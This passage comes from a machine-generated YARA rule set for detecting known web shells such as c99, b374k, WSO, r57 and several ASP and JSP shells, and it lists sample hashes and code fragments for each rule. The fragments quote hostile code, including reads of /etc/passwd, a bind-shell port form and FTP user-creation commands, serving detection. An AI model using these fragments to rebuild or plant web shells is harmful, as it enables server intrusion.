      $s19 = "while(1){" fullword ascii /* Goodware String - occured 1 times */
      $s20 = "$full = $pwd.$file;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _c66_c99v2_c99_w4cking_Shell__ci___Biz_was_here_c99_228 {
   meta:
      description = "webshell - from files c66.php, c99v2.php, c99_w4cking.php, Shell [ci] .Biz was here.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash3 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash4 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash5 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "     echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" na" ascii
      $s2 = "      echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" n" ascii
      $s3 = "     echo \"<br><br><input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Dump\\\"><br><br><b><sup>1</sup></b> - all, if empt" ascii
      $s4 = "b>SQL-Dump:</b><br><br>\";" fullword ascii
      $s5 = "    ?><form action=\"<?php echo $surl; ?>\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_" ascii
      $s6 = "    if ((!$submit) or ($sql_act)) {echo \"<table border=\\\"0\\\" width=\\\"100%\\\" height=\\\"1\\\"><tr><td><form action=\\\"" ascii
      $s7 = "e=\"sql_port\" value=\"<?php echo htmlspecialchars($sql_port); ?>\"><select name=\"sql_db\"><?php" fullword ascii
      $s8 = "rColorLight=#c0c0c0 border=1><tr><td><b>Field</b></td><td><b>Type</b></td><td><b>Function</b></td><td><b>Value</b></td></tr>\";" fullword ascii
      $s9 = "Action</b></td></tr>\";" fullword ascii
      $s10 = "</b>\"; echo \"<input type=\\\"hidden\\\" name=\\\"sql_tbl_insert_q\\\" value=\\\"\".htmlspecialchars($sql_tbl_insert_q).\"\\\">" ascii
      $s11 = "put type=\\\"submit\\\" name=\\\"sql_confirm\\\" value=\\\"Yes\\\">&nbsp;<input type=\\\"submit\\\" value=\\\"No\\\"></form></td" ascii
      $s12 = "rderColorLight=#c0c0c0 border=1>\";" fullword ascii
      $s13 = " if ($sql_port)   {$sql_surl .= \"&sql_port=\".htmlspecialchars($sql_port);}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99_w4cking_Shell__ci___Biz_was_here_229 {
   meta:
      description = "webshell - from files c99_w4cking.php, Shell [ci] .Biz was here.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash2 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
   strings:
      $s1 = "$action = fread($fichier, filesize($temp));" fullword ascii
      $s2 = "$temp=tempnam($test, \"cx\");" fullword ascii
      $s3 = "$fichier = fopen($temp, \"r\");" fullword ascii
      $s4 = "if(copy(\"compress.zlib://\".$file, $temp)){" fullword ascii
      $s5 = "</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwid" ascii
      $s6 = "; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-col" ascii
      $s7 = "$get=htmlspecialchars($file);" fullword ascii
      $s8 = "or: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND:" ascii
      $s9 = "fclose($fichier);" fullword ascii
      $s10 = "function rsg_glob()" fullword ascii
      $s11 = "$test=\"\";" fullword ascii
      $s12 = "<B>\".htmlspecialchars($file).\"</B> dosen't exists or you don't have" fullword ascii
      $s13 = "        <input type=hidden name=act value=\"cmd\">" fullword ascii
      $s14 = "$source=htmlspecialchars($action);" fullword ascii
      $s15 = "        <input type=hidden name=\"cmd_txt\" value=\"1\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_4_b374k_3_2_2_b374k_2_3_b374k_3_2_3_230 {
   meta:
      description = "webshell - from files b374k-2.4.php, b374k-3.2.2.php, b374k-2.3.php, b374k-3.2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash2 = "72c6af6a4be99e31c4a7a0aa4f01750792788e7f6f9749243a9f2c47c14a708f"
      hash3 = "e6b1fbcc9a2d988ef9e8c36da38f19a802a5886a43736a1466566f97f342f946"
      hash4 = "53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf"
   strings:
      $s1 = "$res = ob_get_contents();" fullword ascii
      $s2 = "$tmpdir = get_writabledir();" fullword ascii
      $s3 = "chdir($tmpdir);" fullword ascii
      $s4 = "echo $res;" fullword ascii
      $s5 = "eval(\"phpinfo(\".$i.\");\");" fullword ascii
      $s6 = "foreach($i_buffsss as $i){" fullword ascii
      $s7 = "foreach($i_buffs as $i){" fullword ascii
      $s8 = "\".$owner.\"" fullword ascii
      $s9 = "foreach($phpinfo as $p=>$i){" fullword ascii
      $s10 = "foreach($i_buffs as $i_buffss){" fullword ascii
      $s11 = "$i_buffss = trim($i_buffss);" fullword ascii
      $s12 = "$file = str_replace('\\\\', '/', $file);" fullword ascii /* Goodware String - occured 1 times */
      $s13 = "$owner = \"\";" fullword ascii
      $s14 = "$i = trim($i);" fullword ascii
      $s15 = "$i_buffs = explode(\"\\n\\n\", $i_buff);" fullword ascii
      $s16 = "foreach($i_buffss as $i_b){" fullword ascii
      $s17 = "$ii = explode(\":\",$i);" fullword ascii
      $s18 = "if($i_buffss!=\"\"){" fullword ascii
      $s19 = "$i_buffss = explode(\"\\n\", $i_buffs[1]);" fullword ascii
      $s20 = "if($i!=\"\"){" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso_4_2_3_wso_4_2_5__v_231 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso-4.2.3.php, wso-4.2.5.php, .v.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash3 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash4 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
   strings:
      $s1 = ".'<tr><td></td><td style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</td><" ascii
      $s2 = "Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass'> Using: <label><select name='using'" ascii
      $s3 = ".'<tr><td></td><td style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</td><" ascii
      $s4 = "echo '<h1>Console</h1><div class=content><form name=cf onsubmit=\"if(d.cf.cmd.value==\\'clear\\'){d.cf.output.value=\\'\\';d.cf." ascii
      $s5 = "lse{g(null,null,this.cmd.value,this.show_errors.checked?1:\\'\\');} return false;\"><label><select name=alias>';" fullword ascii
      $s6 = ".'<td><input type=radio name=type value=\"1\" checked> /etc/passwd</td></tr>'" fullword ascii
      $s7 = "echo \">PostgreSql</option></select></label></td>" fullword ascii
      $s8 = ".'<td><label><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</" ascii
      $s9 = ".'<td><label><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</" ascii
      $s10 = ":block;}" fullword ascii
      $s11 = "echo '</select></label>';" fullword ascii
      $s12 = "> Using: <label><select name='using'><option value='bcc'>C</option><option value='bcp'>Perl</option></select></label> <input typ" ascii
      $s13 = "echo \"<label><select name=sql_base><option value=''></option>\";" fullword ascii
      $s14 = "<td><label><select name='type'><option value='mysql' \";" fullword ascii
      $s15 = "label {position:relative}" fullword ascii
      $s16 = "echo '</select></label><input type=button onclick=\"add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.c" ascii
      $s17 = "ll,this.selectTool.value,this.input.value);} return false;'><label><select name='selectTool'>\";" fullword ascii
      $s18 = ".'<tr><td></td><td><input type=radio name=type value=\"2\"> Dictionary</td></tr>'" fullword ascii
      $s19 = "echo \"<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,n" ascii
      $s20 = "option></select></label></td></tr><tr><td>'" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_0_wso_4_2_1_wso2_WSO_4_0_5_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_wso_ng_wso_232 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.0.php, wso-4.2.1.php, wso2.php, WSO_4_0_5.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php, wso-ng.php, wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash3 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash4 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash5 = "b4c76bead50773295dc09fc006ec5143c7aa3558db7c96cccddb8ab180f8d63b"
      hash6 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash7 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash8 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash9 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash10 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash11 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash12 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
      hash13 = "7dd2dad4b336d3d76a3a9f43aba0a119dc13a95fd1572c5c92d4996916848fb8"
      hash14 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $s1 = "$cwd = @getcwd();" fullword ascii
      $s2 = "$disable_functions = @ini_get('disable_functions');" fullword ascii
      $s3 = "<form method=post name=mf style='display:none;'>" fullword ascii
      $s4 = "$home_cwd = @getcwd();" fullword ascii
      $s5 = "function add(cmd) {" fullword ascii
      $s6 = "function actionBruteforce() {" fullword ascii
      $s7 = "<h1>Sql browser</h1><div class=content>" fullword ascii
      $s8 = "function actionNetwork() {" fullword ascii
      $s9 = "function actionFilesTools() {" fullword ascii
      $s10 = "function actionStringTools() {" fullword ascii
      $s11 = "function actionPhp() {" fullword ascii
      $s12 = "function actionFilesMan() {" fullword ascii
      $s13 = "function actionSecInfo() {" fullword ascii
      $s14 = "function kp(e) {" fullword ascii
      $s15 = "function actionSql() {" fullword ascii
      $s16 = "function actionSelfRemove() {" fullword ascii
      $s17 = "function actionConsole() {" fullword ascii
      $s18 = "<input type=hidden name=p2>" fullword ascii
      $s19 = "if(window.Event) window.captureEvents(Event.KEYDOWN);" fullword ascii
      $s20 = "var cur = 0;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _2008_icesword_silic_ghost_source_2009mssql_233 {
   meta:
      description = "webshell - from files 2008.php, icesword.php, silic.php, ghost_source.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash2 = "adf16adeffb5b05dda9e3588f06dba46fcd520c33f113ec0090cd4cda82b8b11"
      hash3 = "8f00d641fc0655d989b3c6abaf414266f1a2c877be5ada07b4265aa069729aca"
      hash4 = "a423ef2bec4f1c75d49c6eeb2b6aa38128dae2afcf6e0e7ebfe196833ea43a78"
      hash5 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "$cdrec .= $hexdtime;" fullword ascii /* Goodware String - occured 1 times */
      $s2 = "$new_offset = strlen(implode('', $this->datasec));" fullword ascii
      $s3 = "$fr .= pack('V', $c_len);" fullword ascii /* Goodware String - occured 1 times */
      $s4 = "$hexdtime" fullword ascii
      $s5 = ".= $hexdtime;" fullword ascii
      $s6 = "$name = str_replace('\\\\', '/', $name);" fullword ascii
      $s7 = "$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);" fullword ascii /* Goodware String - occured 1 times */
      $s8 = "$fr .= pack('v', 0);" fullword ascii /* Goodware String - occured 1 times */
      $s9 = "$fr .= pack('v', strlen($name));" fullword ascii /* Goodware String - occured 1 times */
      $s10 = "$cdrec .= pack('V', 32 );" fullword ascii
      $s11 = "$ctrldir = implode('', $this -> ctrl_dir);" fullword ascii /* Goodware String - occured 1 times */
      $s12 = "$cdrec .= pack('V', $c_len);" fullword ascii /* Goodware String - occured 1 times */
      $s13 = "$cdrec .= \"\\x14\\x00\";" fullword ascii /* Goodware String - occured 1 times */
      $s14 = "eval('$hexdtime = \"' . $hexdtime . '\";');" fullword ascii
      $s15 = "$cdrec .= \"\\x08\\x00\";" fullword ascii /* Goodware String - occured 1 times */
      $s16 = "$cdrec .= pack('V', $unc_len);" fullword ascii /* Goodware String - occured 1 times */
      $s17 = "$fr .= pack('V', $crc);" fullword ascii /* Goodware String - occured 1 times */
      $s18 = "= \"\\x50\\x4b\\x03\\x04\";" fullword ascii
      $s19 = ".= \"\\x08\\x00\";" fullword ascii
      $s20 = ".= \"\\x00\\x00\";" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x6540 ) and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Crystal_r57_Mohajer22_234 {
   meta:
      description = "webshell - from files Crystal.php, r57_Mohajer22.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8cbde0e322651be9d980fe33ddee4844beabc7ded6fbc270d92a3772cd25f284"
      hash2 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $s1 = "if(copy(\"compress.zlib://\".$u1p, $temp)){" fullword ascii
      $s2 = "if(empty($_POST['Mohajer22'])){" fullword ascii
      $s3 = "$m=$_POST['Mohajer22'];" fullword ascii
      $s4 = "$switch = !empty($_POST['switch']) ? $_POST['switch'] : 0;" fullword ascii
      $s5 = "$string = !empty($_POST['string']) ? $_POST['string'] : 0;" fullword ascii
      $s6 = "} elseif ($string && $switch == \"dir\") {" fullword ascii
      $s7 = "if ($string && $switch == \"file\") {" fullword ascii
      $s8 = "$stream = imap_open(\"/etc/passwd\", \"\", \"\");" fullword ascii
      $s9 = "echo \"<pre>\".$str.\"</pre>\";" fullword ascii
      $s10 = "$dir_list = imap_list($stream, trim($string[0]), trim($string[1]));" fullword ascii
      $s11 = "$dir_list = imap_list($stream, trim($string[0]), \"*\");" fullword ascii
      $s12 = "echo \"$dir_list[$i]\".\"<p>&nbsp;</p>\" ;" fullword ascii
      $s13 = "<B>\".htmlspecialchars($u1p).\"</B> dosen't exists or you don't have" fullword ascii
      $s14 = "                                  switch($_POST['plugin']){" fullword ascii
      $s15 = "if (!empty($str))" fullword ascii
      $s16 = "$string = explode(\"|\",$string);" fullword ascii
      $s17 = "if (count($string) > 1)" fullword ascii
      $s18 = "for ($i = 0; $i < count($dir_list); $i++)" fullword ascii
      $s19 = "                                 case(\"cat /etc/passwd\"):" fullword ascii
      $s20 = "die(\"Can't open imap stream\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _asp___1__4_0_2013110125027897_asp__1___2014_10_23_14_54_16__2014_NEW_Web_235 {
   meta:
      description = "webshell - from files asp.asp,  (1).asp, 4.0.asp, 2013110125027897.asp, asp (1)__2014-10-23-14-54-16.asp, _2014.asp, NEW WebShell (1).asp, asp (1).asp, 2014.asp, 4.0 (1).asp, UnKnown Vip (1).asp, asp (1).asp, .asp, asp.asp, UnKnown Vip.asp, asp (1)__2014-10-23-14-54-16.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, 2013.asp, _2012.asp, .asp, vps.asp, NEW WebShell.asp,  (1).asp,  (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash3 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash4 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash5 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash6 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash7 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash8 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash9 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash10 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash11 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash12 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash13 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash14 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash15 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash16 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash17 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash18 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash19 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash20 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash21 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash22 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash23 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash24 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash25 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
   strings:
      $s1 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" & ftpport & vbCrLf & \"-User=go\" & vbCrLf & \"-P" ascii
      $s2 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" & ftpport & vbCrLf & \"-User=go\" & vbCrLf & \"-P" ascii
      $s3 = "newdomain = \"-SETDOMAIN\" & vbCrLf & \"-Domain=goldsun|0.0.0.0|\" & ftpport & \"|-1|1|0\" & vbCrLf & \"-TZOEnable=0\" & vbCrLf " ascii
      $s4 = "newdomain = \"-SETDOMAIN\" & vbCrLf & \"-Domain=goldsun|0.0.0.0|\" & ftpport & \"|-1|1|0\" & vbCrLf & \"-TZOEnable=0\" & vbCrLf " ascii
      $s5 = "deldomain = \"-DELETEDOMAIN\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \" PortNo=\" & ftpport & vbCrLf" fullword ascii
      $s6 = "loginpass = \"Pass \" & pass & vbCrLf" fullword ascii
      $s7 = "loginuser = \"User \" & user & vbCrLf" fullword ascii
      $s8 = "gpath=\"c:\"" fullword ascii
      $s9 = "gpath=f.GetSpecialFolder(0)" fullword ascii
      $s10 = "cmd = trim(request(\"c\"))" fullword ascii
      $s11 = "port = trim(request(\"port\"))" fullword ascii
      $s12 = "pass = trim(request(\"p\"))" fullword ascii
      $s13 = "if request.form(\"pass\")<>\"\" then" fullword ascii
      $s14 = "user = trim(request(\"u\"))" fullword ascii
      $s15 = "if  not isnumeric(SUaction) then response.end" fullword ascii
      $s16 = ":</td>\"" fullword ascii
      $s17 = "gpath=lcase(left(gpath,2))" fullword ascii
      $s18 = "mt = \"SITE MAINTENANCE\" & vbCrLf" fullword ascii
      $s19 = "quit = \"QUIT\" & vbCrLf" fullword ascii
      $s20 = "d\" & vbCrLf & _" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_4_b374k_2_2_b374k_3_2_2_b374k_2_3_b374k_3_2_3_236 {
   meta:
      description = "webshell - from files b374k-2.4.php, b374k-2.2.php, b374k-3.2.2.php, b374k-2.3.php, b374k-3.2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash2 = "5479f8cd1375364770df36e5a18262480a8f9d311e8eedb2c2390ecb233852ad"
      hash3 = "72c6af6a4be99e31c4a7a0aa4f01750792788e7f6f9749243a9f2c47c14a708f"
      hash4 = "e6b1fbcc9a2d988ef9e8c36da38f19a802a5886a43736a1466566f97f342f946"
      hash5 = "53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf"
   strings:
      $s1 = "$psarr = explode(\"\\n\",$res);" fullword ascii
      $s2 = "if($width > 800){" fullword ascii
      $s3 = "$tblcount++;" fullword ascii
      $s4 = "$width = 800;" fullword ascii
      $s5 = "$wcount = count($check);" fullword ascii
      $s6 = "if(trim($query) != \"\"){" fullword ascii
      $s7 = "foreach($querys as $query){" fullword ascii
      $s8 = "$tblcount = 0;" fullword ascii
      $s9 = "$wexplode = \" \";" fullword ascii
      $s10 = "$wcount = 11;" fullword ascii
      $s11 = "foreach($psln as $p){" fullword ascii
      $s12 = "foreach($psarr as $psa){" fullword ascii
      $s13 = "else $imglink = \"\";" fullword ascii
      $s14 = "if($tblcount == 0){" fullword ascii
      $s15 = "if(trim($psa)!=''){" fullword ascii
      $s16 = "$check = explode($wexplode,$psarr[0]);" fullword ascii
      $s17 = "if($fi){" fullword ascii
      $s18 = "$fi = false;" fullword ascii
      $s19 = "$fi = true;" fullword ascii
      $s20 = "$v = $v[0];" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _4ngle_tuo_237 {
   meta:
      description = "webshell - from files 4ngle.aspx, tuo.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7f08aa57086d0f2ba2f1f7a3b1c26a729bbe17f9de3776e31a0f3ba15a3ecae4"
      hash2 = "e22d35913ca3043871b8dd3f6a1ca2239fa4000613d036fd19866f3a5de579b6"
   strings:
      $s1 = "            System.Data.DataSet ds = new System.Data.DataSet();" fullword ascii
      $s2 = "                tmpNum += 1;" fullword ascii
      $s3 = "            connection.Open();" fullword ascii
      $s4 = "        if (serverIP != null & database != null & user != null & pass != null & tableName != null & fileName != null)" fullword ascii
      $s5 = "IP:</td>" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 60KB and ( all of them )
      ) or ( all of them )
}

rule _Browser_download_jsp_File_browser_3_238 {
   meta:
      description = "webshell - from files Browser.jsp, download.jsp, jsp_File_browser.jsp, 3.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
      hash2 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
      hash3 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
      hash4 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
   strings:
      $s1 = "+ cmd + \"&amp;sort=\" + sort[0] + \"\\\">Name</a></th>\"" fullword ascii
      $s2 = "out.println(\" &nbsp;<a href=\\\"\" + browser_name + \"?sort=\" + sortMode + \"&amp;dir=\"" fullword ascii
      $s3 = "buf.insert(0, \"<a href=\\\"\" + browserLink + \"?sort=\" + sortMode + \"&amp;dir=\" + encPath" fullword ascii
      $s4 = "out.println(\" &nbsp;<a href=\\\"\" + browser_name + \"?sort=\" + sortMode" fullword ascii
      $s5 = "out.println(\"<td align=\\\"center\\\">\" + type + \"</td><td align=left> &nbsp;\" + // The file type (extension)" fullword ascii
      $s6 = "out.print(\"<td align=left> &nbsp;\" + link + \"</td>\");" fullword ascii
      $s7 = "buf.insert(0, \"<a href=\\\"\" + browserLink + \"?sort=\" + sortMode + \"&amp;dir=\"" fullword ascii
      $s8 = "String dlink = \"&nbsp;\"; // The \"Download\" link" fullword ascii
      $s9 = "+ \"<th>&nbsp;</th>\");" fullword ascii
      $s10 = "+ \"&amp;sort=\" + sort[3] + \"\\\">Type</a></th>\"" fullword ascii
      $s11 = "+ sortMode + \"&amp;\";" fullword ascii
      $s12 = "+ \"&amp;sort=\" + sort[2] + \"\\\">Date</a></th>\"" fullword ascii
      $s13 = "+ \"&amp;sort=\" + sort[1] + \"\\\">Size</a></th>\"" fullword ascii
      $s14 = "+ \"&amp;dir=\" + name + \"\\\">[\" + buf + \"]</a>\");" fullword ascii
      $s15 = "out.print(\"<tr><th>&nbsp;</th><th title=\\\"Sort files by name\\\" align=left><a href=\\\"\"" fullword ascii
      $s16 = "out.println(\"<td>&nbsp;</td><td align=left >\");" fullword ascii
      $s17 = "if (!READ_ONLY) out.print (\"<th>&nbsp;</th>\");" fullword ascii
      $s18 = "out.print(\"</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td></td></tr>\");" fullword ascii
      $s19 = "if (entry[i].isDirectory()) out.print(\"<td>&nbsp;</td>\");" fullword ascii
      $s20 = "String elink = \"&nbsp;\"; // The \"Edit\" link" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _asp___1__asp__1___2014_10_23_14_54_16_NEW_WebShell__1__asp__1__asp__1_239 {
   meta:
      description = "webshell - from files asp.asp,  (1).asp, asp (1)__2014-10-23-14-54-16.asp, NEW WebShell (1).asp, asp (1).asp, asp (1).asp, .asp, asp.asp, asp (1)__2014-10-23-14-54-16.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, vps.asp, NEW WebShell.asp,  (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash3 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash4 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash5 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash6 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash7 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash8 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
